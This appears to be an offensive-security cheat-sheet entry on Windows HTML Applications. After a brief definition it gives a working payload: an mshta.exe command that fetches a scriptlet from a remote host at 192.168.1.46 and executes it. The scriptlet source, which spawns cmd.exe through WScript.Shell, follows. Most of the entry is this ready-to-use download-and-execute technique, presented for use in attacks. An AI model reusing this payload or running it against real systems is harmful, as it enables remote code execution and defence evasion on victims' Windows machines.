## HTML Applications

An HTML Application is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. The HTML is used to generate the user interface, and the scripting language is used for the program logic.

### payload

```cmd
cmd /c mshta.exe javascript:a=(GetObject("script:http://192.168.1.46/nss-hta.sct")).Exec();close();
```

* `nss-hta.sct`
  
  ```javascript
  <?XML version="1.0"?>
  <scriptlet>
  <registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>
  ```

<public>
    <method name="Exec"></method>
</public>

```xml
<script language="JScript">
<![CDATA[
    function Exec()    {
        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
    }
]]>
</script>
```
